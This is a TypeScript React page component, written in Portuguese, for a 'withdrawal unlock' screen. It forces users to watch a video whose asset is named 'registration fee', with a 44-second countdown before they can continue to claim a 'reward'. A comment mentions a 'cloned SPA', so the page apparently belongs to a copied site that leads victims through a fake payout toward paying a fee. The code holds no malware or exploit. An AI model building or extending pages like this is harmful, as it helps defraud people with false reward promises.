import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import videoAsset from "../assets/taxa-cadastro.mp4.asset.json";

export const Route = createFileRoute("/desbloquear-saque")({
  component: UnlockScreen,
});

function UnlockScreen() {
  const navigate = useNavigate();
  const [secondsLeft, setSecondsLeft] = useState(44);
  const [unlocked, setUnlocked] = useState(false);
  const videoRef = useRef<HTMLVideoElement>(null);

  useEffect(() => {
    if (unlocked) return;
    const id = setInterval(() => {
      setSecondsLeft((s) => {
        if (s <= 1) {
          clearInterval(id);
          setUnlocked(true);
          return 0;
        }
        return s - 1;
      });
    }, 1000);
    return () => clearInterval(id);
  }, [unlocked]);

  const handleContinue = () => {
    try {
      sessionStorage.setItem("videoWatched", "1");
    } catch {}
    // Use full reload navigation so the cloned SPA picks up the route fresh
    window.location.href = "/confirmar-saque" + window.location.search;
  };

  return (
    <div
      style={{
        position: "fixed",
        inset: 0,
        background: "#000",
        zIndex: 999999,
        display: "flex",
        flexDirection: "column",
        fontFamily:
          "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif",
        color: "#fff",
        overflowY: "auto",
      }}
    >
      <header
        style={{
          background: "#ff0050",
          padding: "16px 20px",
          textAlign: "center",
          fontWeight: 700,
          fontSize: 18,
          boxShadow: "0 2px 8px rgba(0,0,0,0.3)",
        }}
      >
        Desbloqueio de Saque
      </header>

      <main
        style={{
          flex: 1,
          padding: "24px 20px",
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          gap: 20,
          maxWidth: 560,
          margin: "0 auto",
          width: "100%",
        }}
      >
        <h1
          style={{
            fontSize: 22,
            fontWeight: 800,
            textAlign: "center",
            margin: 0,
            lineHeight: 1.3,
          }}
        >
          Assista ao vídeo abaixo para desbloquear seu saque
        </h1>
        <p
          style={{
            fontSize: 14,
            opacity: 0.8,
            textAlign: "center",
            margin: 0,
            lineHeight: 1.5,
          }}
        >
          É obrigatório assistir ao vídeo completo para continuar com o resgate da sua
          recompensa.
        </p>

        <video
          ref={videoRef}
          src={videoAsset.url}
          controls
          autoPlay
          playsInline
          style={{
            width: "100%",
            borderRadius: 12,
            background: "#111",
            boxShadow: "0 4px 24px rgba(255,0,80,0.25)",
          }}
        />

        <button
          onClick={handleContinue}
          disabled={!unlocked}
          style={{
            width: "100%",
            padding: "16px 20px",
            borderRadius: 999,
            border: "none",
            background: unlocked ? "#ff0050" : "#3a3a3a",
            color: "#fff",
            fontSize: 16,
            fontWeight: 700,
            cursor: unlocked ? "pointer" : "not-allowed",
            transition: "all 0.2s ease",
            boxShadow: unlocked ? "0 4px 16px rgba(255,0,80,0.4)" : "none",
            marginTop: 8,
          }}
        >
          {unlocked
            ? "Desbloquear Saque"
            : `Aguarde ${secondsLeft}s para desbloquear...`}
        </button>
      </main>
    </div>
  );
}
